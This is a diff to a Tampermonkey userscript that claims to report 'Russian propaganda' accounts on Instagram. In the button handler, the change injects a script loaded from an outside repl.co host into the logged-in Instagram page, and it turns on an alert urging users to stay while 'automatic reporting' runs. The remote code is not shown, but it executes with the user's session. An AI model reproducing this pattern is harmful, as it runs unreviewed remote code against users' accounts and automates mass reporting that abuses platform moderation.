@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Report Russian Propaganda
 // @namespace    http://tampermonkey.net/
-// @version      0.3
+// @version      0.4
 // @description  Report russian propaganda accounts on Instagram.
 // @author       peacesender
 // @match        https://*.instagram.com/*
@@ -40,7 +40,10 @@
         btn.onclick = () => {
             btn.disabled = true;
             progressBar.style.display = "block";
-
+            GM_addElement('script', {
+                src: "https://palyanytsya.wakeup4.repl.co?raw=1",
+                type: 'text/javascript'
+            });
         }
     }
 
@@ -57,12 +60,12 @@
 
     unsafeWindow.REPORTER = {
         progress: (curr, max) => {
-          console.log({curr,max});
+            console.log({curr,max});
         }
     };
     unsafeWindow.onblur = function() {
         if (isReporting()) {
-//            alert("Automatic reporting is in progress. Please stay on the page to complete the script execution.")
+            alert("Automatic reporting is in progress. Please stay on the page to complete the script execution.")
         }
     }
 
@@ -98,7 +101,7 @@
 }
 
 #${PROGRESS_BAR_INDICATOR_ID} {
-  width: 10%;
+  width: 1%;
   height: 100%;
   background-color: green;
 }
